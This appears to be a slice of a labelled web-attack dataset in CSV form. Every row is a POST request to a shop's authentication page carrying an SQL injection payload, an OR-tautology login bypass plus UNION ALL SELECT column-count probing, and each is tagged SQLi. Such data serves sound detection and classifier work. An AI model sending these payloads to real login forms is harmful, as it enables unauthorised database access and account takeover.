,id,method,path,query,label
84,84,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27MofC%27%3D%27MofC&remember=&modo=entrar,SQLi
85,85,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27TCpU%27%3D%27TCpU&remember=&modo=entrar,SQLi
86,86,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27boZw%27%3D%27boZw&remember=&modo=entrar,SQLi
87,87,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27ERGH%27%3D%27ERGH&remember=&modo=entrar,SQLi
88,88,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27tncw%27%3D%27tncw&remember=&modo=entrar,SQLi
89,89,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%2C%204363%23%20AND%20%27QBiX%27%3D%27QBiX&remember=&modo=entrar,SQLi
90,90,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%2C%208731%23%20AND%20%27kxWj%27%3D%27kxWj&remember=&modo=entrar,SQLi
91,91,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%2C%208553%23%20AND%20%27mpWl%27%3D%27mpWl&remember=&modo=entrar,SQLi
92,92,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%2C%2025%23%20AND%20%27YyNG%27%3D%27YyNG&remember=&modo=entrar,SQLi
93,93,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%2C%208405%23%20AND%20%27xQIJ%27%3D%27xQIJ&remember=&modo=entrar,SQLi
94,94,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%2C%209%23%20AND%20%27MfhD%27%3D%27MfhD&remember=&modo=entrar,SQLi
95,95,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%2C%205752%23%20AND%20%27yOzm%27%3D%27yOzm&remember=&modo=entrar,SQLi
96,96,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%2C%202690%23%20AND%20%27gjtk%27%3D%27gjtk&remember=&modo=entrar,SQLi
97,97,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%2C%206253%23%20AND%20%27wsoY%27%3D%27wsoY&remember=&modo=entrar,SQLi
98,98,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%2C%202037%23%20AND%20%27hMpZ%27%3D%27hMpZ&remember=&modo=entrar,SQLi
99,99,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27tfUy%27%3D%27tfUy&remember=&modo=entrar,SQLi
100,100,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27yuYl%27%3D%27yuYl&remember=&modo=entrar,SQLi
101,101,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27TiUd%27%3D%27TiUd&remember=&modo=entrar,SQLi
102,102,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27ERhB%27%3D%27ERhB&remember=&modo=entrar,SQLi
103,103,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27dkgq%27%3D%27dkgq&remember=&modo=entrar,SQLi
104,104,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27BAhV%27%3D%27BAhV&remember=&modo=entrar,SQLi
105,105,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27nCdY%27%3D%27nCdY&remember=&modo=entrar,SQLi
106,106,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27HczV%27%3D%27HczV&remember=&modo=entrar,SQLi
107,107,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27nTJM%27%3D%27nTJM&remember=&modo=entrar,SQLi
108,108,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27PlLT%27%3D%27PlLT&remember=&modo=entrar,SQLi
109,109,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%2C%208030%23%20AND%20%27tXOi%27%3D%27tXOi&remember=&modo=entrar,SQLi
110,110,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%2C%204111%23%20AND%20%27vKXt%27%3D%27vKXt&remember=&modo=entrar,SQLi
111,111,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%2C%207102%23%20AND%20%27pjSh%27%3D%27pjSh&remember=&modo=entrar,SQLi
112,112,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%2C%207790%23%20AND%20%27rLkF%27%3D%27rLkF&remember=&modo=entrar,SQLi
113,113,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%2C%209169%23%20AND%20%27jkDW%27%3D%27jkDW&remember=&modo=entrar,SQLi
114,114,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%2C%203943%23%20AND%20%27IcJO%27%3D%27IcJO&remember=&modo=entrar,SQLi
115,115,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%2C%201890%23%20AND%20%27mYgY%27%3D%27mYgY&remember=&modo=entrar,SQLi
116,116,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%2C%202016%23%20AND%20%27DbKu%27%3D%27DbKu&remember=&modo=entrar,SQLi
117,117,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%2C%205688%23%20AND%20%27FQty%27%3D%27FQty&remember=&modo=entrar,SQLi
118,118,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%2C%205521%23%20AND%20%27ycDb%27%3D%27ycDb&remember=&modo=entrar,SQLi
119,119,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27yEaU%27%3D%27yEaU&remember=&modo=entrar,SQLi
120,120,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27SLlx%27%3D%27SLlx&remember=&modo=entrar,SQLi
121,121,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27XDDn%27%3D%27XDDn&remember=&modo=entrar,SQLi
122,122,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27ZcBa%27%3D%27ZcBa&remember=&modo=entrar,SQLi
123,123,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%23%20AND%20%27TTXq%27%3D%27TTXq&remember=&modo=entrar,SQLi
